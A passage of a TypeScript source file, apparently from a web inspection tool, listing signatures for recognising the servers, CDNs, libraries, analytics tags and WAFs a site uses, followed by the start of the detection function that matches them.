    headers: [{ name: "server", pattern: /Werkzeug|gunicorn/i }],
  },
  {
    name: "FastAPI",
    category: "サーバ",
    icon: "🐍",
    headers: [{ name: "server", pattern: /uvicorn/i }],
  },
  {
    name: "Spring",
    category: "サーバ",
    icon: "🌿",
    cookies: [/^JSESSIONID$/i],
    headers: [{ name: "x-application-context", pattern: /./ }],
  },
  {
    name: "Laravel",
    category: "サーバ",
    icon: "🟥",
    cookies: [/^laravel_session$/i, /^XSRF-TOKEN$/i],
  },
  {
    name: "Symfony",
    category: "サーバ",
    icon: "🎼",
    cookies: [/^sf_redirect$/i],
    headers: [{ name: "x-powered-by", pattern: /Symfony/i }],
  },
  {
    name: "ASP.NET",
    category: "サーバ",
    icon: "🅰️",
    headers: [
      { name: "x-powered-by", pattern: /ASP\.NET/i },
      { name: "x-aspnet-version", pattern: /./ },
      { name: "x-aspnetmvc-version", pattern: /./ },
    ],
    cookies: [/^ASP\.NET_SessionId$/i],
  },
  {
    name: "ASP.NET Core",
    category: "サーバ",
    icon: "🅰️",
    headers: [{ name: "server", pattern: /Kestrel/i }],
  },
  {
    name: "Java Servlet",
    category: "サーバ",
    icon: "☕",
    cookies: [/^JSESSIONID$/i],
  },
  {
    name: "Node.js",
    category: "サーバ",
    icon: "🟢",
    headers: [{ name: "x-powered-by", pattern: /Express|Next\.js|Node/i }],
  },
  {
    name: "Tomcat",
    category: "サーバ",
    icon: "🐈",
    headers: [{ name: "server", pattern: /Apache-Coyote|Tomcat/i }],
  },

  // ============================================================
  // Webサーバ / リバースプロキシ
  // ============================================================
  {
    name: "Nginx",
    category: "Webサーバ",
    icon: "🟩",
    headers: [{ name: "server", pattern: /nginx(?:\/([\d.]+))?/i }],
    version: [/nginx\/([\d.]+)/i],
  },
  {
    name: "Apache HTTP Server",
    category: "Webサーバ",
    icon: "🪶",
    headers: [{ name: "server", pattern: /Apache(?:\/([\d.]+))?/i }],
    version: [/Apache\/([\d.]+)/i],
  },
  {
    name: "Microsoft IIS",
    category: "Webサーバ",
    icon: "🪟",
    headers: [{ name: "server", pattern: /Microsoft-IIS(?:\/([\d.]+))?/i }],
  },
  {
    name: "LiteSpeed",
    category: "Webサーバ",
    icon: "💨",
    headers: [{ name: "server", pattern: /LiteSpeed/i }],
  },
  {
    name: "Caddy",
    category: "Webサーバ",
    icon: "🟦",
    headers: [{ name: "server", pattern: /Caddy/i }],
  },
  {
    name: "Envoy",
    category: "Webサーバ",
    icon: "🟪",
    headers: [{ name: "server", pattern: /envoy/i }],
  },
  {
    name: "OpenResty",
    category: "Webサーバ",
    icon: "🟩",
    headers: [{ name: "server", pattern: /openresty/i }],
  },
  {
    name: "Varnish",
    category: "キャッシュ",
    icon: "🛡️",
    headers: [
      { name: "via", pattern: /varnish/i },
      { name: "x-varnish", pattern: /./ },
    ],
  },
  {
    name: "HAProxy",
    category: "リバースプロキシ",
    icon: "🟪",
    headers: [{ name: "server", pattern: /HAProxy/i }],
  },

  // ============================================================
  // CDN / インフラ
  // ============================================================
  {
    name: "Cloudflare",
    category: "CDN",
    icon: "☁️",
    html: [/cdnjs\.cloudflare\.com|challenges\.cloudflare\.com/i],
    headers: [
      { name: "server", pattern: /cloudflare/i },
      { name: "cf-ray", pattern: /./ },
      { name: "cf-cache-status", pattern: /./ },
    ],
    cookies: [/^__cf_bm$/i, /^cf_clearance$/i],
  },
  {
    name: "Fastly",
    category: "CDN",
    icon: "🌐",
    headers: [
      { name: "x-served-by", pattern: /cache-/i },
      { name: "x-fastly-request-id", pattern: /./ },
      { name: "via", pattern: /varnish.*fastly/i },
    ],
  },
  {
    name: "Akamai",
    category: "CDN",
    icon: "🌐",
    headers: [
      { name: "x-akamai-transformed", pattern: /./ },
      { name: "akamai-grn", pattern: /./ },
      { name: "server", pattern: /AkamaiGHost/i },
    ],
  },
  {
    name: "Amazon CloudFront",
    category: "CDN",
    icon: "🌐",
    headers: [
      { name: "via", pattern: /CloudFront/i },
      { name: "x-amz-cf-id", pattern: /./ },
      { name: "x-amz-cf-pop", pattern: /./ },
    ],
  },
  {
    name: "Google Cloud CDN",
    category: "CDN",
    icon: "🌐",
    headers: [
      { name: "via", pattern: /Google Frontend/i },
      { name: "server", pattern: /gws/i },
    ],
  },
  {
    name: "Microsoft Azure CDN",
    category: "CDN",
    icon: "🌐",
    headers: [
      { name: "x-azure-ref", pattern: /./ },
      { name: "x-msedge-ref", pattern: /./ },
    ],
  },
  {
    name: "BunnyCDN",
    category: "CDN",
    icon: "🐰",
    headers: [
      { name: "server", pattern: /BunnyCDN/i },
      { name: "cdn", pattern: /bunnycdn/i },
    ],
  },
  {
    name: "KeyCDN",
    category: "CDN",
    icon: "🌐",
    headers: [{ name: "server", pattern: /keycdn/i }],
  },
  {
    name: "Vercel",
    category: "ホスティング",
    icon: "▲",
    headers: [
      { name: "server", pattern: /Vercel/i },
      { name: "x-vercel-id", pattern: /./ },
      { name: "x-vercel-cache", pattern: /./ },
    ],
  },
  {
    name: "Netlify",
    category: "ホスティング",
    icon: "🟦",
    headers: [
      { name: "server", pattern: /Netlify/i },
      { name: "x-nf-request-id", pattern: /./ },
    ],
  },
  {
    name: "GitHub Pages",
    category: "ホスティング",
    icon: "🐙",
    headers: [
      { name: "server", pattern: /GitHub\.com/i },
      { name: "x-github-request-id", pattern: /./ },
    ],
  },
  {
    name: "Render",
    category: "ホスティング",
    icon: "🟪",
    headers: [{ name: "x-render-origin-server", pattern: /./ }],
  },
  {
    name: "Fly.io",
    category: "ホスティング",
    icon: "🪂",
    headers: [
      { name: "fly-request-id", pattern: /./ },
      { name: "server", pattern: /Fly\/?([\w.]+)?/i },
    ],
  },
  {
    name: "Heroku",
    category: "ホスティング",
    icon: "🟪",
    headers: [
      { name: "via", pattern: /vegur/i },
      { name: "x-request-id", pattern: /./ },
    ],
  },
  {
    name: "jsDelivr",
    category: "CDN",
    icon: "📦",
    url: [/cdn\.jsdelivr\.net/i],
  },
  { name: "unpkg", category: "CDN", icon: "📦", url: [/unpkg\.com\//i] },
  {
    name: "Google Hosted Libraries",
    category: "CDN",
    icon: "📦",
    url: [/ajax\.googleapis\.com/i],
  },

  // ============================================================
  // JS ライブラリ / フレームワーク
  // ============================================================
  {
    name: "React",
    category: "JSライブラリ",
    icon: "⚛️",
    html: [
      /data-reactroot|data-reactid|__REACT_DEVTOOLS|react(\.production|\.development)?(\.min)?\.js/i,
    ],
    global: ["React", "ReactDOM"],
  },
  {
    name: "Vue.js",
    category: "JSライブラリ",
    icon: "💚",
    html: [
      /v-cloak|v-if=|v-for=|vue(?:\.runtime)?(?:\.global)?(?:\.min)?\.js|data-v-[a-z0-9]+/i,
    ],
    global: ["Vue", "__VUE__"],
  },
  {
    name: "Angular",
    category: "JSライブラリ",
    icon: "🅰️",
    html: [
      /ng-version=|ng-(?:app|controller|repeat|model)|\bangular(?:\.min)?\.js/i,
    ],
    global: ["ng", "angular"],
  },
  {
    name: "Svelte",
    category: "JSライブラリ",
    icon: "🟧",
    html: [/svelte-[a-z0-9]{4,}/i],
  },
  {
    name: "Preact",
    category: "JSライブラリ",
    icon: "⚛️",
    html: [/preact(?:\.min)?\.js/i],
    global: ["preact"],
  },
  {
    name: "SolidJS",
    category: "JSライブラリ",
    icon: "🟦",
    html: [/_solid\b|solid-js/i],
  },
  {
    name: "Lit",
    category: "JSライブラリ",
    icon: "🔥",
    html: [/lit-html|lit-element/i],
  },
  {
    name: "Alpine.js",
    category: "JSライブラリ",
    icon: "🏔️",
    html: [/x-data=|x-init=|x-show=|alpine(?:\.min)?\.js/i],
  },
  {
    name: "Stimulus",
    category: "JSライブラリ",
    icon: "🎯",
    html: [/data-controller=|stimulus(?:\.min)?\.js/i],
  },
  {
    name: "HTMX",
    category: "JSライブラリ",
    icon: "🔁",
    html: [/hx-(?:get|post|trigger|target|swap)=|htmx(?:\.min)?\.js/i],
  },
  {
    name: "jQuery",
    category: "JSライブラリ",
    icon: "💲",
    html: [/jquery(?:-\d|\.min)?\.js/i],
    global: ["jQuery", "$"],
  },
  {
    name: "jQuery UI",
    category: "JSライブラリ",
    icon: "💲",
    html: [/jquery-ui(?:\.min)?\.js/i],
  },
  {
    name: "Lodash",
    category: "JSライブラリ",
    icon: "🧰",
    html: [/lodash(?:\.min)?\.js/i],
    global: ["_"],
  },
  {
    name: "Underscore.js",
    category: "JSライブラリ",
    icon: "🧰",
    html: [/underscore(?:\.min)?\.js/i],
  },
  {
    name: "Moment.js",
    category: "JSライブラリ",
    icon: "⏱",
    html: [/moment(?:\.min)?\.js/i],
    global: ["moment"],
  },
  {
    name: "Day.js",
    category: "JSライブラリ",
    icon: "⏱",
    html: [/dayjs(?:\.min)?\.js/i],
  },
  {
    name: "Three.js",
    category: "JSライブラリ",
    icon: "🎮",
    html: [/three(?:\.min)?\.js/i],
    global: ["THREE"],
  },
  {
    name: "D3.js",
    category: "JSライブラリ",
    icon: "📊",
    html: [/d3(?:\.v[1-9])?(?:\.min)?\.js/i],
    global: ["d3"],
  },
  {
    name: "Chart.js",
    category: "JSライブラリ",
    icon: "📊",
    html: [/chart(?:js|\.min)?\.js/i],
    global: ["Chart"],
  },
  {
    name: "Highcharts",
    category: "JSライブラリ",
    icon: "📊",
    html: [/highcharts(?:\.min)?\.js/i],
    global: ["Highcharts"],
  },
  {
    name: "ECharts",
    category: "JSライブラリ",
    icon: "📊",
    html: [/echarts(?:\.min)?\.js/i],
    global: ["echarts"],
  },
  {
    name: "Mapbox GL JS",
    category: "地図",
    icon: "🗺",
    html: [/mapbox-gl(?:\.min)?\.js/i],
    global: ["mapboxgl"],
  },
  {
    name: "Leaflet",
    category: "地図",
    icon: "🗺",
    html: [/leaflet(?:\.min)?\.js/i],
    global: ["L"],
  },
  {
    name: "Google Maps",
    category: "地図",
    icon: "🗺",
    url: [/maps\.googleapis\.com\/maps\/api\/js/i],
  },
  {
    name: "OpenLayers",
    category: "地図",
    icon: "🗺",
    html: [/openlayers|ol\.js|ol\.css/i],
  },
  {
    name: "Modernizr",
    category: "JSライブラリ",
    icon: "🧪",
    html: [/modernizr(?:\.min)?\.js/i],
  },
  {
    name: "GSAP",
    category: "JSライブラリ",
    icon: "🎬",
    html: [/gsap(?:\.min)?\.js|TweenMax|TimelineMax/i],
  },
  {
    name: "Anime.js",
    category: "JSライブラリ",
    icon: "🎬",
    html: [/anime(?:\.min)?\.js/i],
  },
  {
    name: "Lottie",
    category: "JSライブラリ",
    icon: "🎬",
    html: [/lottie(?:-web)?(?:\.min)?\.js/i],
  },
  {
    name: "Swiper",
    category: "JSライブラリ",
    icon: "🎠",
    html: [/swiper(?:-bundle)?(?:\.min)?\.(?:js|css)/i],
  },
  {
    name: "Slick",
    category: "JSライブラリ",
    icon: "🎠",
    html: [/slick(?:-carousel)?(?:\.min)?\.(?:js|css)/i],
  },
  {
    name: "Video.js",
    category: "JSライブラリ",
    icon: "📺",
    html: [/video-js(?:\.min)?\.(?:js|css)|videojs/i],
  },
  {
    name: "Plyr",
    category: "JSライブラリ",
    icon: "📺",
    html: [/plyr(?:\.min)?\.(?:js|css)/i],
  },

  // ============================================================
  // CSS フレームワーク
  // ============================================================
  {
    name: "Tailwind CSS",
    category: "CSS",
    icon: "🎨",
    html: [
      /(?:class|className)=["'][^"']*\b(?:bg-|text-|flex|grid|p-\d|m-\d|w-\d|h-\d)/i,
      /tailwind(?:\.min)?\.css/i,
      /\bcdn\.tailwindcss\.com\b/i,
    ],
  },
  {
    name: "Bootstrap",
    category: "CSS",
    icon: "🎨",
    html: [
      /bootstrap(?:\.min)?\.css|class="[^"]*\b(?:container|row|col-(?:xs|sm|md|lg|xl)-)/i,
    ],
  },
  {
    name: "Bulma",
    category: "CSS",
    icon: "🎨",
    html: [/bulma(?:\.min)?\.css/i],
  },
  {
    name: "Foundation",
    category: "CSS",
    icon: "🎨",
    html: [/foundation(?:\.min)?\.css/i],
  },
  {
    name: "Material UI / MUI",
    category: "CSS",
    icon: "🎨",
    html: [/mui-|material-ui|@mui\//i],
  },
  {
    name: "Chakra UI",
    category: "CSS",
    icon: "🎨",
    html: [/chakra-(?:ui|c\d)/i],
  },
  {
    name: "Ant Design",
    category: "CSS",
    icon: "🎨",
    html: [/ant-design|antd(?:\.min)?\.css|\bant-row\b|\bant-col-/i],
  },
  {
    name: "Element UI / Plus",
    category: "CSS",
    icon: "🎨",
    html: [/element-ui|element-plus|el-button|el-row/i],
  },
  {
    name: "Vuetify",
    category: "CSS",
    icon: "🎨",
    html: [/vuetify(?:\.min)?\.css/i],
  },
  {
    name: "Semantic UI",
    category: "CSS",
    icon: "🎨",
    html: [/semantic(?:-ui)?(?:\.min)?\.css/i],
  },
  {
    name: "UIKit",
    category: "CSS",
    icon: "🎨",
    html: [/uikit(?:\.min)?\.css/i],
  },
  {
    name: "Pure CSS",
    category: "CSS",
    icon: "🎨",
    html: [/pure(?:-min)?\.css/i],
  },
  {
    name: "Bulma",
    category: "CSS",
    icon: "🎨",
    html: [/bulma(?:\.min)?\.css/i],
  },
  {
    name: "Font Awesome",
    category: "アイコン",
    icon: "🌟",
    html: [/font-?awesome|fa-solid|fa-regular|fa-brands/i],
  },
  {
    name: "Material Icons",
    category: "アイコン",
    icon: "🌟",
    html: [/material-icons|fonts\.googleapis\.com\/icon/i],
  },
  {
    name: "Iconify",
    category: "アイコン",
    icon: "🌟",
    html: [/iconify(?:\.min)?\.js|api\.iconify\.design/i],
  },

  // ============================================================
  // ビルドツール / バンドラ
  // ============================================================
  {
    name: "Webpack",
    category: "ビルド",
    icon: "📦",
    html: [/webpackJsonp|__webpack_require__|webpack-runtime/i],
  },
  {
    name: "Vite",
    category: "ビルド",
    icon: "⚡",
    html: [/\/@vite\/|@id\/|vite\/dist/i],
  },
  { name: "Parcel", category: "ビルド", icon: "📦", html: [/parcelRequire/i] },
  { name: "esbuild", category: "ビルド", icon: "⚡", html: [/__esbuild_/i] },
  { name: "Rollup", category: "ビルド", icon: "📦", html: [/__rollup_/i] },
  {
    name: "Turbopack",
    category: "ビルド",
    icon: "🚀",
    html: [/__turbopack_/i],
  },

  // ============================================================
  // 解析 / タグマネ / 広告 / A-B テスト
  // ============================================================
  {
    name: "Google Analytics (UA)",
    category: "解析",
    icon: "📊",
    html: [
      /google-analytics\.com\/(?:ga|analytics)\.js|gtag\(['"]config['"], ?['"]UA-/i,
    ],
  },
  {
    name: "Google Analytics 4",
    category: "解析",
    icon: "📊",
    url: [/gtag\/js\?id=G-/i],
    html: [/gtag\(['"]config['"], ?['"]G-/i],
  },
  {
    name: "Google Tag Manager",
    category: "タグ管理",
    icon: "🏷️",
    url: [/googletagmanager\.com\/gtm\.js/i],
    html: [/GTM-[A-Z0-9]+/],
  },
  {
    name: "Microsoft Clarity",
    category: "解析",
    icon: "📊",
    url: [/clarity\.ms\/tag\//i],
  },
  {
    name: "Hotjar",
    category: "解析",
    icon: "🔥",
    url: [/static\.hotjar\.com/i],
    html: [/hjSetting/i],
  },
  {
    name: "Mixpanel",
    category: "解析",
    icon: "📊",
    url: [/cdn\.mixpanel\.com/i],
    html: [/mixpanel\.init/i],
  },
  {
    name: "Amplitude",
    category: "解析",
    icon: "📊",
    url: [/cdn\.amplitude\.com/i],
    global: ["amplitude"],
  },
  {
    name: "Heap",
    category: "解析",
    icon: "📊",
    url: [/cdn\.heapanalytics\.com/i],
  },
  {
    name: "Segment",
    category: "解析",
    icon: "📊",
    url: [/cdn\.segment\.com/i],
    global: ["analytics"],
  },
  {
    name: "Plausible",
    category: "解析",
    icon: "📊",
    url: [/plausible\.io\/js\//i],
  },
  {
    name: "Fathom",
    category: "解析",
    icon: "📊",
    url: [/cdn\.usefathom\.com/i],
  },
  {
    name: "Matomo (Piwik)",
    category: "解析",
    icon: "📊",
    html: [/matomo\.js|piwik\.js/i],
  },
  {
    name: "Adobe Analytics",
    category: "解析",
    icon: "📊",
    html: [/s_code\.js|AppMeasurement\.js/i],
  },
  {
    name: "Adobe Target",
    category: "A-Bテスト",
    icon: "🎯",
    html: [/at\.js|adobedtm\.com/i],
  },
  {
    name: "Optimizely",
    category: "A-Bテスト",
    icon: "🧪",
    url: [/cdn\.optimizely\.com/i],
  },
  {
    name: "VWO",
    category: "A-Bテスト",
    icon: "🧪",
    url: [/dev\.visualwebsiteoptimizer\.com/i],
  },
  {
    name: "Google Optimize",
    category: "A-Bテスト",
    icon: "🧪",
    url: [/googleoptimize\.com\//i],
  },
  {
    name: "New Relic",
    category: "監視",
    icon: "🛡️",
    url: [/js-agent\.newrelic\.com|bam\.nr-data\.net/i],
  },
  {
    name: "Datadog RUM",
    category: "監視",
    icon: "🐶",
    url: [/datadoghq-browser-agent|browser-intake-datadoghq/i],
  },
  {
    name: "Sentry",
    category: "監視",
    icon: "🔭",
    url: [/browser\.sentry-cdn\.com|sentry\.io|@sentry/i],
  },
  {
    name: "LogRocket",
    category: "監視",
    icon: "🚀",
    url: [/cdn\.logrocket\.com/i],
  },
  {
    name: "Bugsnag",
    category: "監視",
    icon: "🐛",
    url: [/d2wy8f7a9ursnm\.cloudfront\.net|bugsnag/i],
  },
  {
    name: "Yahoo! JAPAN タグマネージャ",
    category: "タグ管理",
    icon: "🏷️",
    url: [/s\.yjtag\.jp/i],
    html: [/YJ_HISTORICAL/],
  },
  {
    name: "Google AdSense",
    category: "広告",
    icon: "💰",
    url: [/pagead2\.googlesyndication\.com/i],
    html: [/adsbygoogle/i],
  },
  {
    name: "Google Ad Manager (DFP)",
    category: "広告",
    icon: "💰",
    url: [/securepubads\.g\.doubleclick\.net/i],
    html: [/googletag\.cmd/i],
  },
  {
    name: "Facebook Pixel",
    category: "解析",
    icon: "📊",
    url: [/connect\.facebook\.net\/[^/]+\/fbevents\.js/i],
    html: [/fbq\(['"]init['"]/i],
  },
  {
    name: "TikTok Pixel",
    category: "解析",
    icon: "🎵",
    url: [/analytics\.tiktok\.com/i],
  },
  {
    name: "LinkedIn Insight",
    category: "解析",
    icon: "💼",
    url: [/snap\.licdn\.com\/li\.lms-analytics/i],
  },
  {
    name: "Pinterest Tag",
    category: "解析",
    icon: "📌",
    url: [/s\.pinimg\.com\/ct\/core\.js/i],
  },
  {
    name: "X (Twitter) Pixel",
    category: "解析",
    icon: "❌",
    url: [/static\.ads-twitter\.com/i],
  },
  {
    name: "LINE Tag",
    category: "解析",
    icon: "💬",
    url: [/d\.line-scdn\.net\/n\/line_tag/i],
  },
  {
    name: "Yahoo! JAPAN リスティング広告",
    category: "広告",
    icon: "🏷️",
    url: [/s\.yimg\.jp\/images\/listing\/tool\/cv/i],
  },
  {
    name: "Twitter / X Widget",
    category: "SNS",
    icon: "❌",
    url: [/platform\.twitter\.com\/widgets\.js/i],
    html: [/twitter-tweet/i],
  },
  {
    name: "Facebook SDK",
    category: "SNS",
    icon: "📘",
    url: [/connect\.facebook\.net\/[^/]+\/sdk\.js/i],
  },
  {
    name: "Hatena Bookmark Button",
    category: "SNS",
    icon: "🇯🇵",
    url: [/b\.hatena\.ne\.jp\/js\//i],
  },
  {
    name: "YouTube Embed",
    category: "メディア",
    icon: "📺",
    html: [/<iframe[^>]+(?:youtube\.com\/embed|youtu\.be)/i],
  },
  {
    name: "Vimeo Embed",
    category: "メディア",
    icon: "📺",
    html: [/<iframe[^>]+player\.vimeo\.com/i],
  },

  // ============================================================
  // フォント
  // ============================================================
  {
    name: "Google Fonts",
    category: "フォント",
    icon: "🔤",
    url: [/fonts\.googleapis\.com|fonts\.gstatic\.com/i],
  },
  {
    name: "Adobe Fonts (Typekit)",
    category: "フォント",
    icon: "🔤",
    url: [/use\.typekit\.net/i],
  },
  {
    name: "Fontawesome (CDN)",
    category: "フォント",
    icon: "🔤",
    url: [/use\.fontawesome\.com/i],
  },

  // ============================================================
  // セキュリティ / WAF
  // ============================================================
  {
    name: "reCAPTCHA",
    category: "セキュリティ",
    icon: "🛡️",
    url: [/www\.google\.com\/recaptcha|www\.gstatic\.com\/recaptcha/i],
  },
  {
    name: "hCaptcha",
    category: "セキュリティ",
    icon: "🛡️",
    url: [/hcaptcha\.com\/1\/api\.js/i],
  },
  {
    name: "Cloudflare Turnstile",
    category: "セキュリティ",
    icon: "🛡️",
    url: [/challenges\.cloudflare\.com\/turnstile/i],
  },
  {
    name: "Akamai Bot Manager",
    category: "セキュリティ",
    icon: "🛡️",
    headers: [{ name: "x-akam-sw-version", pattern: /./ }],
    cookies: [/^_abck$/i, /^bm_sz$/i, /^ak_bmsc$/i],
  },
  {
    name: "PerimeterX",
    category: "セキュリティ",
    icon: "🛡️",
    headers: [{ name: "x-px", pattern: /./ }],
    cookies: [/^_px/i],
  },
  {
    name: "DataDome",
    category: "セキュリティ",
    icon: "🛡️",
    headers: [
      { name: "x-datadome", pattern: /./ },
      { name: "server", pattern: /datadome/i },
    ],
  },
  {
    name: "Imperva Incapsula",
    category: "セキュリティ",
    icon: "🛡️",
    headers: [
      { name: "x-iinfo", pattern: /./ },
      { name: "x-cdn", pattern: /Incapsula/i },
    ],
    cookies: [/^visid_incap_/i, /^incap_ses_/i],
  },
  {
    name: "AWS WAF",
    category: "セキュリティ",
    icon: "🛡️",
    headers: [{ name: "x-amzn-waf-action", pattern: /./ }],
    cookies: [/^aws-waf-token$/i],
  },
  {
    name: "Sucuri",
    category: "セキュリティ",
    icon: "🛡️",
    headers: [
      { name: "server", pattern: /Sucuri\/Cloudproxy/i },
      { name: "x-sucuri-id", pattern: /./ },
    ],
  },

  // ============================================================
  // CRM / マーケ
  // ============================================================
  {
    name: "HubSpot",
    category: "マーケ",
    icon: "🟧",
    url: [/js\.hs-scripts\.com|js\.hsforms\.net|js\.hubspot\.com/i],
  },
  {
    name: "Marketo",
    category: "マーケ",
    icon: "🟪",
    url: [/munchkin\.marketo\.net/i],
  },
  {
    name: "Pardot / Account Engagement",
    category: "マーケ",
    icon: "🟦",
    url: [/pi\.pardot\.com/i],
  },
  {
    name: "Intercom",
    category: "サポート",
    icon: "💬",
    url: [/widget\.intercom\.io/i],
    global: ["Intercom"],
  },
  {
    name: "Zendesk",
    category: "サポート",
    icon: "💬",
    url: [/static\.zdassets\.com|assets\.zendesk\.com/i],
  },
  {
    name: "Drift",
    category: "サポート",
    icon: "💬",
    url: [/js\.driftt\.com/i],
  },
  {
    name: "Tawk.to",
    category: "サポート",
    icon: "💬",
    url: [/embed\.tawk\.to/i],
  },
  {
    name: "Crisp",
    category: "サポート",
    icon: "💬",
    url: [/client\.crisp\.chat/i],
  },

  // ============================================================
  // 決済 / 認証
  // ============================================================
  { name: "Auth0", category: "認証", icon: "🔐", url: [/cdn\.auth0\.com/i] },
  {
    name: "Firebase Auth",
    category: "認証",
    icon: "🔐",
    url: [/www\.gstatic\.com\/firebasejs|firebase-auth\.js/i],
  },
  {
    name: "Okta",
    category: "認証",
    icon: "🔐",
    url: [/global\.oktacdn\.com/i],
  },
  {
    name: "Clerk",
    category: "認証",
    icon: "🔐",
    url: [/cdn\.clerk\.io|@clerk\//i],
  },

  // ============================================================
  // データベース / バックエンド (ヒント)
  // ============================================================
  {
    name: "Firebase",
    category: "BaaS",
    icon: "🔥",
    url: [/firebaseio\.com|gstatic\.com\/firebasejs/i],
  },
  { name: "Supabase", category: "BaaS", icon: "🟢", url: [/supabase\.co/i] },
  {
    name: "Algolia",
    category: "検索",
    icon: "🔎",
    url: [/cdn\.jsdelivr\.net\/npm\/algoliasearch|algolianet\.com/i],
  },
  {
    name: "Elastic",
    category: "検索",
    icon: "🔎",
    url: [/elastic-app-search/i],
  },

  // ============================================================
  // PWA / マニフェスト
  // ============================================================
  {
    name: "Service Worker",
    category: "PWA",
    icon: "⚙️",
    html: [/navigator\.serviceWorker\.register|serviceworker\.js|sw\.js/i],
  },
  {
    name: "Web App Manifest",
    category: "PWA",
    icon: "📱",
    html: [/<link[^>]+rel=["']manifest["']/i],
  },
  {
    name: "Open Graph",
    category: "メタ",
    icon: "🏷️",
    html: [/<meta[^>]+property=["']og:/i],
  },
  {
    name: "Twitter Cards",
    category: "メタ",
    icon: "🏷️",
    html: [/<meta[^>]+name=["']twitter:/i],
  },
  {
    name: "JSON-LD (schema.org)",
    category: "メタ",
    icon: "🏷️",
    html: [/<script[^>]+type=["']application\/ld\+json["']/i],
  },
  {
    name: "AMP",
    category: "メタ",
    icon: "⚡",
    html: [/<html[^>]+\b(?:amp|⚡)\b/i],
  },
  {
    name: "HTTP/2",
    category: "プロトコル",
    icon: "🌐",
    headers: [{ name: ":status", pattern: /./ }],
  },
  {
    name: "HTTP/3 (QUIC)",
    category: "プロトコル",
    icon: "🌐",
    headers: [{ name: "alt-svc", pattern: /h3=|h3-/i }],
  },
  // ===== 追加: YouTube / Polymer / Redux / Hammer.js / XRegExp / Closure / Priority Hints / Google Fonts =====
  {
    name: "YouTube",
    category: "ビデオプレーヤー",
    icon: "📺",
    html: [/<ytd-app|ytcfg\.set\(|ytInitialPlayerResponse|ytInitialData/i],
    url: [/s\.ytimg\.com|youtube\.com\/s\/player|youtube\.com\/youtubei\//i],
  },
  {
    name: "Polymer",
    category: "JSフレームワーク",
    icon: "🔬",
    html: [/<dom-module|Polymer\(\{|Polymer\.Element|<paper-|<iron-|<ytd-app/i],
    global: ["Polymer"],
    version: [/Polymer\.version\s*[:=]\s*['"]([\d.]+)['"]/],
  },
  {
    name: "Redux",
    category: "JSフレームワーク",
    icon: "🟪",
    html: [/__REDUX_DEVTOOLS_EXTENSION__|createStore\(|combineReducers\(/i],
    global: ["__REDUX_DEVTOOLS_EXTENSION__"],
  },
  {
    name: "Hammer.js",
    category: "JSライブラリ",
    icon: "🔨",
    html: [/Hammer\.VERSION|new Hammer\(/i],
    url: [/hammer(?:\.min)?\.js/i],
    version: [/Hammer\.VERSION\s*=\s*['"]([\d.]+)['"]/],
  },
  {
    name: "XRegExp",
    category: "JSライブラリ",
    icon: "🔣",
    html: [/XRegExp\.version|XRegExp\(/i],
    version: [/XRegExp\.version\s*=\s*['"]([\d.]+)['"]/],
  },
  {
    name: "Closure Library",
    category: "JSライブラリ",
    icon: "🔒",
    html: [/goog\.provide\(|goog\.require\(|goog\.module\(/i],
    global: ["goog"],
  },
  {
    name: "Priority Hints",
    category: "パフォーマンス",
    icon: "⚡",
    html: [
      /<(?:link|img|script|iframe)[^>]+fetchpriority\s*=\s*["'](?:high|low|auto)/i,
    ],
  },
  {
    name: "Google Font API",
    category: "フォント",
    icon: "🔤",
    html: [/fonts\.googleapis\.com|fonts\.gstatic\.com/i],
    url: [/fonts\.googleapis\.com|fonts\.gstatic\.com/i],
  },
  {
    name: "Trusted Types",
    category: "セキュリティ",
    icon: "🛡️",
    html: [/trustedTypes\.createPolicy|require-trusted-types-for/i],
    headers: [{ name: "content-security-policy", pattern: /trusted-types/i }],
  },
];

interface DetectedTech {
  name: string;
  category: string;
  icon?: string;
  matches: string[];
  version?: string;
}

/** HTML から <script src> / <link href> / <iframe src> の URL を抜き出す。 */
function extractAssetUrls(html: string): string[] {
  const urls: string[] = [];
  const re =
    /(?:<script[^>]+src|<link[^>]+href|<iframe[^>]+src)\s*=\s*["']([^"']+)["']/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(html)) !== null) {
    urls.push(m[1]);
    if (urls.length > 1000) break;
  }
  return urls;
}

/**
 * HTML / Content-Type / レスポンスヘッダ / Cookie / グローバル変数 をもとに
 * 検出された技術スタック一覧を返す。Wappalyzer 風だが日本サービスや
 * セキュリティ系・サーバ系まで広めにカバー。
 */
function detectTechFromHtml(
  html: string,
  contentType: string,
  headers: [string, string][] = [],
  cookies: string[] = [],
  globals: string[] = [],
): DetectedTech[] {
  const out: DetectedTech[] = [];
  // YouTube などの SPA はレンダリング後 DOM が 1MB を超えることがあるため
  // 200KB の頭部だけを見ると <script src> や ytcfg などの判定に必要なテキストが
  // ハッシュ化された下部に追いやられて漏れる。広めに 1.5MB 取得する。
  const head = html.slice(0, 1500000);
  const assetUrls = extractAssetUrls(head);
  const headerJoined = headers.map(([k, v]) => `${k}: ${v}`).join("\n");
  const cookieSet = new Set(cookies.map((c) => c.toLowerCase()));
  const globalSet = new Set(globals);

  for (const sig of TECH_SIGNATURES) {
    const reasons: string[] = [];
    let version: string | undefined;

    const tryVersion = (src: string): void => {
      if (version || !sig.version) return;
      for (const re of sig.version) {
        const m = src.match(re);
        if (m && m[1]) {
          version = m[1];
          return;
        }
      }
    };

    if (sig.html) {
      for (const re of sig.html) {
        const m = head.match(re);
        if (m) {
          reasons.push(`HTML: ${truncate(re.source)}`);
          tryVersion(m[0]);
          break;
        }
      }
    }
    if (sig.url && assetUrls.length > 0) {
      outer: for (const re of sig.url) {
        for (const u of assetUrls) {
          if (re.test(u)) {
            reasons.push(`URL: ${truncate(u)}`);
            tryVersion(u);
            break outer;
          }
        }
      }
    }
    if (sig.contentType && contentType) {
      for (const re of sig.contentType) {
        if (re.test(contentType)) {
          reasons.push(`Content-Type: ${truncate(re.source)}`);
          break;
        }
      }
    }
    if (sig.meta) {
      for (const m of sig.meta) {
        const re = new RegExp(
          `<meta[^>]+name=["']${m.name}["'][^>]+content=["']([^"']*)["']`,
          "i",
        );
        const found = head.match(re);
        if (found && m.pattern.test(found[1])) {
          reasons.push(`<meta ${m.name}="${truncate(found[1])}">`);
          tryVersion(found[1]);
          break;
        }
      }
    }
    if (sig.headers && headers.length > 0) {
      for (const h of sig.headers) {
        const v = headers.find(([k]) => k === h.name)?.[1];
        if (v && h.pattern.test(v)) {
          reasons.push(`Header ${h.name}: ${truncate(v)}`);
          tryVersion(v);
          break;
        }
      }
    }
    if (sig.cookies && cookieSet.size > 0) {
      for (const re of sig.cookies) {
        for (const c of cookieSet) {
          if (re.test(c)) {
            reasons.push(`Cookie: ${c}`);
            break;
          }
        }
